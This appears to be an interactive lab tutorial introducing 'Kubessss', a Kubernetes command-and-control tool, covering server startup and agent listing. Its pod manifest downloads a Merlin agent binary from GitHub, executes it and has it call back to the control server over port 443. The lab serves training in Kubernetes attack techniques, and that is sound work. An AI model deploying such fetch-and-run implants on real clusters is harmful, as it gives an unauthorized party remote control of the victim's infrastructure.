Here we will see the basic settings of Kubessss.

## Basics of Kubessss

#### Server

	
The server is located in the `controlplane` with a configuration file `config.yaml`.    
The server uses this file to create a listener to a given protocol, interface and port.   
The server IP that should be inside the Interface is `kubectl get nodes -o jsonpath='{ $.items[?(@.metadata.name=="controlplane")].status.addresses[?(@.type=="InternalIP")].address }{"\n"}'`{{execute}}.  

Verify that the `config.yaml` file contains the server IP address: `cat config.yaml`{{execute}}

Start the server `./server`{{execute}}.    
To view the menu, run `help`{{execute}} and to see the list of modules run `use module <TAB>`.  
*You can use the `TAB` in any place to see the list commands.  

Let's continue and see examples.  


`Open`{{execute T3}} new terminal on the master and tart this vulnerable container:  
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-container
spec:
  containers:
  - name: priv-container
    image: ubuntu
    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443", "sleep infinity" ]
EOF```{{execute T2}}  


Go to the first terminal of the master and check if a new connection was received with the message "New authenticated agent checkin..".  
Then, run `main`{{execute T1}} and then `agent list`{{execute T1}} to see the new connection.  

